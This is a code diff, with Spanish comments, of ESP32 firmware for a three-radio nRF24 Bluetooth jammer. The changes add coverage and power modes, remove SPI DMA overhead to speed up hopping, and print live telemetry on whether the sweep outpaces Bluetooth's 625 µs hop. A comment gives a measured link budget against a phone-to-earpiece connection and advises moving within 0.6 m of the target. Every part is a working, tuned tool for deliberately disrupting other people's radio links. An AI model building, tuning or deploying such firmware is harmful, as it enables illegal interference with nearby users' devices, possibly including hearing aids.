@@ -6,25 +6,33 @@
  *   NRF1 -> SPI2 (CS 10) CE 4  IRQ 15  | core 1
  *   NRF3 -> SPI3 (CS 21) CE 1  IRQ 2   | core 0
  *
- * CE FIJO (PA siempre on). Con dwell < 130us el PLL no engancha y la portadora
- * BARRE: chirp broadband deliberado, no un defecto.
+ * CE FIJO (PA siempre on).
  *
- * ====== POR QUE hop() USA EL DRIVER Y NO EL BANG ======
- * Medido en esta placa: las 3 alineaciones del bang fallan (ver log
- * "bang align=-1"). El camino de registro directo NO escribe en el nRF.
- * Por eso hop() usa nrf_write_reg() (driver). Es ~5us mas lento por salto,
- * pero FUNCIONA. El bang queda solo como test y se activa en caliente UNICAMENTE
- * si bang_probar() lo valida: g_usar_bang se setea solo si realmente escribio.
+ * ====== 3 MODOS, MEDIBLES EN EL LOG ======
+ * MODO_ANCHO    : 3 radios en tercios, dwell 10us. Revisita ~390us.
+ *                 Golpea mas veces, cada golpe es chirp (potencia dispersa).
+ *                 El BT salta cada 625us -> 390 < 625 => ACIERTA.
+ * MODO_PLENO    : 3 radios en tercios, dwell 130us (PLL clavado).
+ *                 Revisita ~3.5ms. Golpea menos, pero con potencia PLENA.
+ *                 Es lo que usa AntonBronnfjell ("130us PLL dwell, CW strikes").
+ * MODO_TRIDENTE : los 3 radios JUNTOS en el mismo canal, dwell 130us.
+ *                 +4.8 dB en un canal (3 fuentes incoherentes suman potencia).
+ *                 Revisita 79 x 135 = 10.7ms: cobertura lenta a cambio de golpe
+ *                 fuerte. Sirve si el objetivo esta lejos.
  *
- * ====== MATEMATICA DEL BARRIDO ======
- * Con fases 0/26/53 los 3 radios cubren la banda en tercios: el tiempo de
- * REVISITA de un canal es 26 x dwell, NO 79 x dwell.
- *   dwell 20us -> revisita 520us  < 625us del salto BT  -> ACIERTA
- *   dwell 45us -> revisita 1.17ms  (tu ultima version, por eso a veces no)
- *   dwell 70us -> revisita 1.82ms
- * El dwell es LA variable. Mas bajo = mejor.
+ * Elegi por medicion, no por fe: el log imprime REVISITA y us/hop reales.
  *
- * WiFi OFF: el CSMA/CA lo mataba (0-5 frames/s) y provocaba phy wait timeout.
+ * ====== POR QUE SPI_DMA_DISABLED ======
+ * Medido con DMA activo: 20700 hops/s EXACTOS en los 3 radios => 48.3us por
+ * hop, de los cuales solo 20 eran dwell. Los otros 28us eran overhead del
+ * motor DMA (setup de descriptores) en transferencias de 2 bytes. Sin DMA
+ * el hop baja a ~5us. Revisita = 26 x (dwell + overhead): el overhead
+ * account la mitad del barrido.
+ *
+ * ====== TECHO FISICO (no es codigo) ======
+ * Link budget medido: telefono->audifono -36 dBm, jammer->audifono -31.5 dBm
+ * => S/J = -4.5 dB. Para matar un paquete BT hace falta S/J <= -10 dB, o sea
+ * 14 dB mas. Se consiguen ACERCANDOSE (3m -> 0.6m = +14 dB), no con software.
  */
 
 #include <stdio.h>
@@ -48,9 +56,17 @@
 static const char *TAG = "JAM";
 
 /* ================= config ================= */
-#define SPI_HZ_RAPIDO (16 * 1000 * 1000)   /* si el modulo no lo banca, cae a 10M */
+#define SPI_HZ_RAPIDO (16 * 1000 * 1000)
 #define SPI_HZ_SEGURO (10 * 1000 * 1000)
-#define WIFI_JAM      0                    /* 0 = solo nRF */
+#define WIFI_JAM      0
+
+/* ---- elegi UNO ---- */
+#define MODO_ANCHO     1   /* revisita ~390us : maxima cobertura   */
+#define MODO_PLENO     2   /* revisita ~3.5ms : potencia por golpe */
+#define MODO_TRIDENTE  3   /* +4.8 dB, revisita ~10.7ms           */
+#ifndef MODO_JAM
+#define MODO_JAM MODO_ANCHO
+#endif
 
 /* ================= GPIO directo ================= */
 #define GPIO_OUT_W1TS  (*(volatile uint32_t *)0x60004008u)
@@ -59,7 +75,7 @@ static const char *TAG = "JAM";
 /* ================= tiempo ================= */
 #define CPU_MHZ 240u
 #define MS_CYC  (CPU_MHZ * 1000u)
-#define YIELD_MS 500u                       /* ceder a idle/telemetria cada 500 ms */
+#define YIELD_MS 500u
 
 static inline __attribute__((always_inline)) uint32_t cyc(void) {
     uint32_t c; __asm__ __volatile__("rsr.ccount %0" : "=a"(c)); return c;
@@ -113,7 +129,7 @@ typedef struct {
     spi_dev_t  *hw;
     uint8_t    canal;
     volatile uint32_t hops;
-    bool       bang_ok;      /* true solo si bang_probar VALIDO la escritura */
+    bool       bang_ok;
 } radio_t;
 
 static radio_t radios[NUM_RADIOS] = {
@@ -125,15 +141,21 @@ static radio_t radios[NUM_RADIOS] = {
       .ce=GPIO_NUM_1, .cs=GPIO_NUM_21, .sck=GPIO_NUM_18, .mosi=GPIO_NUM_8,  .miso=GPIO_NUM_7,  .irq=GPIO_NUM_2  },
 };
 
-/* dwell: < 130us = PLL sin enganchar = portadora que BARRE (chirp ancho,
- * energia repartida en canales vecinos). 130us = PLL clavado = potencia
- * plena en un canal. El ladder alterna las dos cosas.
- * Revisita de canal = 26 x dwell (los 3 radios cubren tercios). */
-static const uint16_t ladder[] = { 20, 20, 20, 130 };
+/* dwell y ladder por modo */
+#if   MODO_JAM == MODO_ANCHO
+  static const uint16_t ladder[] = { 10, 10, 10, 130 };
+  #define MODO_TXT "ANCHO (cobertura)"
+#elif MODO_JAM == MODO_PLENO
+  static const uint16_t ladder[] = { 130, 130, 130, 130 };
+  #define MODO_TXT "PLENO (potencia/golpe)"
+#else
+  static const uint16_t ladder[] = { 130, 130, 130, 130 };
+  #define MODO_TXT "TRIDENTE (+4.8 dB)"
+#endif
 #define DWELL_STEPS (sizeof(ladder)/sizeof(ladder[0]))
 #define DWELL_PERIODO_MS 8000
 
-static volatile uint16_t g_dwell = 20;
+static volatile uint16_t g_dwell = ladder[0];
 static volatile uint32_t g_k = 0;
 static volatile uint32_t g_irq_cnt[NUM_RADIOS];
 static uint8_t           g_bang_align = 0;
@@ -146,7 +168,7 @@ static inline void cs_hi(radio_t *r) { GPIO_OUT_W1TS = 1u << (uint32_t)r->cs; }
 
 static void IRAM_ATTR irq_isr(void *arg) { g_irq_cnt[(int)(intptr_t)arg]++; }
 
-/* ================= SPI por registro (IRAM) — SOLO si bang_probar lo valida ================= */
+/* ================= SPI por registro (IRAM) ================= */
 static inline spi_dev_t *spi_hw(spi_host_device_t h) {
     return (h == SPI2_HOST) ? &GPSPI2 : &GPSPI3;
 }
@@ -159,7 +181,7 @@ static void bang_arm(radio_t *r) {
     hw->user.usr_mosi = 1;  hw->user.usr_miso = 0;
     hw->user.usr_addr = 0;  hw->user.usr_command = 0;  hw->user.usr_dummy = 0;
     hw->dma_conf.dma_tx_ena = 0;  hw->dma_conf.dma_rx_ena = 0;
-    hw->ms_dlen.ms_data_bitlen = 15;   /* 16 bits: cmd + val */
+    hw->ms_dlen.ms_data_bitlen = 15;
 }
 
 static inline IRAM_ATTR void bang_write(radio_t *r, uint8_t cmd, uint8_t val) {
@@ -212,7 +234,7 @@ static void jam_enter(radio_t *r) {
     nrf_write_reg(r, NRF_RF_SETUP, RF_SETUP_CW);
     nrf_write_reg(r, NRF_RF_CH, JAM_CH_LO);
     r->canal = JAM_CH_LO;
-    ce_hi(r);            /* CE fijo: PA siempre on */
+    ce_hi(r);
     bang_arm(r);
 }
 
@@ -250,7 +272,9 @@ static void led_init(void) {
 static void bus_init(spi_host_device_t h, gpio_num_t sck, gpio_num_t mosi, gpio_num_t miso) {
     spi_bus_config_t b = { .mosi_io_num=mosi, .miso_io_num=miso, .sclk_io_num=sck,
         .quadwp_io_num=-1, .quadhd_io_num=-1, .max_transfer_sz=64 };
-    ESP_ERROR_CHECK(spi_bus_initialize(h, &b, SPI_DMA_CH_AUTO));
+    /* DMA OFF: con 2 bytes por transferencia el setup del DMA cuesta ~28us,
+     * mas que la transferencia. Medido: 20700 hops/s con DMA. */
+    ESP_ERROR_CHECK(spi_bus_initialize(h, &b, SPI_DMA_DISABLED));
 }
 
 static bool radio_add(radio_t *r, int hz) {
@@ -294,25 +318,46 @@ static void irq_selftest(radio_t *r) {
     else ESP_LOGW(TAG, "%s IRQ trabado en bajo", r->nombre);
 }
 
-static bool bang_probar(radio_t *r, uint8_t a) {
-    g_bang_align = a;
-    bang_write(r, CMD_W_REGISTER | NRF_RF_CH, 0x2A);
-    return nrf_read_reg(r, NRF_RF_CH) == 0x2A;
+static void bang_detectar(radio_t *r) {
+    spi_dev_t *cand[2];
+    cand[0] = &GPSPI2;
+    cand[1] = &GPSPI3;
+
+    for (int i = 0; i < 2; i++) {
+        for (int a = 0; a < 3; a++) {
+            g_bang_align = (uint8_t)a;
+            r->hw = cand[i];
+            bang_write(r, CMD_W_REGISTER | NRF_RF_CH, 0x2A);
+            if (nrf_read_reg(r, NRF_RF_CH) == 0x2A) {
+                r->bang_ok = true;
+                ESP_LOGI(TAG, "%s BANG OK: GPSPI%d align=%d", r->nombre, i + 2, a);
+                return;
+            }
+        }
+    }
+    r->bang_ok = false;
+    r->hw = spi_hw(r->host);
+    ESP_LOGW(TAG, "%s BANG NO: uso driver", r->nombre);
 }
 
-/* ================= lazo caliente =================
- * hop() usa el DRIVER. El bang solo se usa si bang_probar lo VALIDO en el
- * arranque: si flasheas y el log dice bang=0, el camino rapido esta muerto
- * en tu placa y no hay forma de activarlo por software. */
+/* ================= lazo caliente ================= */
 static inline IRAM_ATTR void hop(radio_t *r, uint32_t k) {
-    uint8_t ch = (uint8_t)(JAM_CH_LO + (r->fase + k) % JAM_CH_N);
+    uint8_t ch;
+#if MODO_JAM == MODO_TRIDENTE
+    /* los 3 radios al MISMO canal: 3 fuentes incoherentes suman potencia
+     * => +4.8 dB en ese canal. Revisita = 79 x dwell. */
+    ch = (uint8_t)(JAM_CH_LO + k % JAM_CH_N);
+#else
+    /* cada radio su tercio: cobertura total, revisita = 26 x dwell */
+    ch = (uint8_t)(JAM_CH_LO + (r->fase + k) % JAM_CH_N);
+#endif
     r->canal = ch;
     if (r->bang_ok) bang_write(r, CMD_W_REGISTER | NRF_RF_CH, ch);
     else            nrf_write_reg(r, NRF_RF_CH, ch);
     r->hops++;
 }
 
-/* core 1: SPI2 (NRF2 + NRF1). Lleva el tick global y el LED. */
+/* core 1: SPI2 (NRF2 + NRF1). Tick global + LED. */
 static void IRAM_ATTR jam_loop_a(void *arg) {
     uint32_t t_led = 0, t_peld = 0, t_yield = 0;
     int peld = 0;
@@ -336,9 +381,7 @@ static void IRAM_ATTR jam_loop_a(void *arg) {
     }
 }
 
-/* core 0: SPI3 (NRF3). Sigue el tick de core 1.
- * El yield cuesta ~1ms; al volver, resincroniza para NO hacer catch-up
- * de todos los ticks perdidos (evita una rafaga de saltos). */
+/* core 0: SPI3 (NRF3). Resincroniza tras el yield. */
 static void IRAM_ATTR jam_loop_b(void *arg) {
     uint32_t last = 0, t_yield = cyc();
     for (;;) {
@@ -354,18 +397,23 @@ static void IRAM_ATTR jam_loop_b(void *arg) {
     }
 }
 
-/* Telemetria: prio baja, no puede colgar el jammer.
- * MIDE si los 3 radios van parejos y a que velocidad real. */
+/* Telemetria: us/hop REAL + revisita. Es el numero que decide. */
 static void tel_task(void *arg) {
     uint32_t p0 = 0, p1 = 0, p2 = 0;
     while (1) {
         vTaskDelay(pdMS_TO_TICKS(2000));
         uint32_t h0 = radios[0].hops, h1 = radios[1].hops, h2 = radios[2].hops;
-        ESP_LOGI(TAG, "hops/s NRF2=%lu NRF1=%lu NRF3=%lu | dwell=%u | revisita=%luus | bang=%d/%d/%d",
+        uint32_t us0 = (h0 - p0) ? (2000000UL / (h0 - p0)) : 0;
+#if MODO_JAM == MODO_TRIDENTE
+        uint32_t rev = 79UL * us0;
+#else
+        uint32_t rev = 26UL * us0;
+#endif
+        ESP_LOGI(TAG, "hops/s %lu/%lu/%lu | us/hop=%lu | REVISITA=%luus | dwell=%u | %s",
                  (unsigned long)((h0-p0)/2), (unsigned long)((h1-p1)/2), (unsigned long)((h2-p2)/2),
+                 (unsigned long)us0, (unsigned long)rev,
                  (unsigned)g_dwell,
-                 (unsigned long)(26UL * (unsigned long)g_dwell),
-                 (int)radios[0].bang_ok, (int)radios[1].bang_ok, (int)radios[2].bang_ok);
+                 rev < 625 ? ">> ACIERTA AL BT" : ">> EL BT SE VA");
         p0 = h0; p1 = h1; p2 = h2;
     }
 }
@@ -394,30 +442,23 @@ void app_main(void) {
         jam_enter(&radios[i]);
     }
 
-    /* Calibra el bang. Si FALLA (como en esta placa), bang_ok queda en false
-     * y hop() usa el driver. No aborta: el driver funciona igual. */
     for (int i = 0; i < NUM_RADIOS; i++) {
         if (!radios[i].spi) continue;
-        int al = -1;
-        for (int a = 0; a < 3 && al < 0; a++) if (bang_probar(&radios[i], (uint8_t)a)) al = a;
-        radios[i].bang_ok = (al >= 0);
-        ESP_LOGI(TAG, "%s bang align=%d -> %s", radios[i].nombre, al,
-                 radios[i].bang_ok ? "USO BANG (camino rapido)" : "uso DRIVER (camino lento)");
+        bang_detectar(&radios[i]);
         nrf_write_reg(&radios[i], NRF_RF_CH, JAM_CH_LO);
         radios[i].canal = JAM_CH_LO;
         bang_arm(&radios[i]);
     }
 
-    /* Arcoiris solo con los 3 vivos. */
     g_jam_ok = (activos == NUM_RADIOS);
 
     xTaskCreatePinnedToCore(jam_loop_a, "jamA", 4096, NULL, configMAX_PRIORITIES-1, NULL, 1);
     xTaskCreatePinnedToCore(jam_loop_b, "jamB", 4096, NULL, configMAX_PRIORITIES-1, NULL, 0);
     xTaskCreatePinnedToCore(tel_task,   "tel",  2048, NULL, 1, NULL, 0);
 
-    ESP_LOGI(TAG, "JAM TOTAL · %d NRF @%dMHz · 79 canales BT · dwell=%u · revisita=%luus",
-             activos, g_spi_hz/1000000, (unsigned)g_dwell,
-             (unsigned long)(26UL * (unsigned long)g_dwell));
-    ESP_LOGI(TAG, "BT salta cada 625us: revisita < 625us = ACIERTA SIEMPRE");
+    ESP_LOGI(TAG, "MODO=%s | %d NRF @%dMHz | 79 canales | DMA OFF | dwell=%u",
+             MODO_TXT, activos, g_spi_hz/1000000, (unsigned)g_dwell);
+    ESP_LOGI(TAG, "meta: REVISITA < 625us (salto del BT). Si dice 'EL BT SE VA',");
+    ESP_LOGI(TAG, "baja el dwell o cambia de modo. Y ACERCATE: +14 dB por ir a 0.6 m.");
     vTaskDelay(portMAX_DELAY);
 }
